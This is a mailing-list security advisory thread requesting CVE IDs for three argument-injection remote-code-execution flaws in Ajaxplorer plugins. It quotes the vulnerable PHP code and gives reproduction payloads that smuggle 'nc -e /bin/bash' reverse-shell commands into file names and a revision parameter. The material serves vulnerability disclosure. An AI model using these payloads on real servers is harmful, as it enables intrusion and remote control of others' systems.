  oss-security - Re: CVE requests for Ajaxplorer            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [day] [month] [year] [list]  Date: Wed, 21 Aug From: Kurt Seifried <kseifried@...hat.com> To: oss-security@...ts.openwall.com CC: "Mehrenberger, Xavier" <Xavier.Mehrenberger@...sidian.com> Subject: Re: CVE requests for Ajaxplorer  -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1  On AM, Mehrenberger, Xavier wrote: > Hello, >  > I'd like to request CVE identifiers for three remote shell > execution vulnerabilities I have discovered in ajaxplorer. These > vulnerabilities are public, and have been fixed by upstream (see  > advisory below). >  > Kurt, this is the same advisory I sent you privately, describing > the same vulnerabilities. No identifiers have been issued yet. >  > Thanks  top posting:  Ajaxeplorer "Power FS" action.powerfs Ajaxeplorer "File System (Standard)" access.fs Ajaxeplorer "Subversion Repository" meta.svn   > ======================================= Advisory title: Several > ajaxplorer remote exec vulnerabilities Product: Ajaxplorer > plugins Credit: Xavier Mehrenberger, Cassidian CyberSecurity  > Upstream URL: http://ajaxplorer.info/ Vulnerable version: > plugins and probably earlier versions Tested: June  > Fixed in: released Public fixes:  > > >  > Category: Remote Code Execution Vulnerability type: [CWE-88] > Argument Injection or Modification CVE IDs: None yet Affected > plugins: * "Power FS" action.powerfs * "File System (Standard)" > access.fs * "Subversion Repository" meta.svn By: Xavier > Mehrenberger Cassidian CyberSecurity  > http://www.cassidiancybersecurity.com  > ======================================= >  > ----- 1st vulnerability Affected plugin: "Power FS" action.powerfs  > Plugin URL: http://ajaxplorer.info/plugins/action/powerfs/ Plugin > description: delegate various time/memory-consuming actions to the  > underlying filesystem. Required configuration: Power FS plugin is > enabled. This can be done from the web interface by any user with > sufficient privileges. User has to be logged in to ajaxplorer. >  > Steps to reproduce: * Select one or more files * Click > More>Compress... * Use 'a";nc -e /bin/bash;"b' as > file name to execute a command on the server. This example command > provides you with a reverse shell on (ajaxplorer > installed on localhost for test purposes) >  > Vulnerable code sample: --- file > plugins/action.powerfs/class.PowerFSController.php line > $archiveName = $httpVars["archive_name"]; ... $cmd = "zip -r > \"".$archiveName."\" ".implode(" ", $args); ... $proc = > popen($cmd, "r"); --- The $archiveName variable is controlled by > the attacker, and is not escaped before passing it to popen().  > Proposed fix: properly sanitize user-controlled parameters. >  >  > ----- 2nd vulnerability Affected plugin: "File System (Standard)" > access.fs Plugin URL: http://ajaxplorer.info/plugins/access/fs/  > Plugin description: Access to the local filesystem Required > configuration: "Real Size Probing" is set to "Yes" in File System  > plugin configuration. This option is set to "No" by default in > but can be set from the web interface by any user with > sufficient privileges. User has to be logged in to ajaxplorer. >  > Steps to reproduce: * Create a new empty file * Set its name as > '$(nc -e bash)' (remove single quotes). This example > command provides you with a reverse shell on  > (ajaxplorer installed on localhost for test purposes) >  > Vulnerable code sample: --- file > plugins/access.fs/class.fsAccessWrapper.php, lines  > protected function getTrueSizeOnFileSystem($file) { $cmd = > "stat -L -c%s \"".$file."\""; $val = trim(`$cmd`); $cmd = > "ls -1s --block-size=1 \"".$file."\""; $val = trim(`$cmd`); > $cmd = "ls -l \"".$file."\""; $arr = explode("/[\s]+/", > `$cmd`); --- Line is probably affected as well - executed on > Windows machines, not tested. The $file value is controlled by the > attacker, and is not escaped before passing it to backticks '`'.  > Proposed fix: properly sanitize user-controlled parameters. >  >  > ----- 3rd vulnerability Affected plugin: "Subversion Repository" > meta.svn Plugin URL: http://ajaxplorer.info/plugins/meta/svn/  > Plugin description: Use an SVN working copy as an ajaxplorer > repository Required configuration: The SVN plugin has to be > enabled, and an ajaxplorer "SVN repository" has to be present. This > can be done from the web interface by any user with sufficient > privileges. User has to be logged in to ajaxplorer. >  > Steps to reproduce: * Send a forged revert_file request (ex. using > burp or webscarab) Such revert_file request get send when a user > tries to revert a file from an SVN working directory. * Set the > 'revision' parameter to '1; nc -e /bin/bash; echo'  > (remove single quotes). This example command provides you with a > reverse shell on (ajaxplorer installed on localhost > for test purposes) >  > Vulnerable code sample: --- file > plugins/meta.svn/class.SvnManager.php, lines and > $revision = $httpVars["revision"]; ... system( > (SVNLIB_PATH!=""?SVNLIB_PATH."/":"") ."svn cat -r$revision  > $escapedFile > ".escapeshellarg($targetFile)); }else{ > system( (SVNLIB_PATH!=""?SVNLIB_PATH."/":"") ."svn cat -r$revision  > $escapedFile > $escapedFile"); --- The $revision variable is > controlled by the attacker, and is not escaped properly. Proposed > fix: properly sanitize user-controlled parameters. >  >  >   - --  Kurt Seifried Red Hat Security Response Team (SRT) PGP: A90B 66BF -----BEGIN PGP SIGNATURE----- Version: GnuPG (GNU/Linux)  xEmPsbxrIjhyspFVfCzmsAfUjVfQ5mcCr0BeOSiUqSjnpyhVWCwBVmirAjgpxjPZ HqoqCcLnE3+brbehPpB+ =U6z1 -----END PGP SIGNATURE-----  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      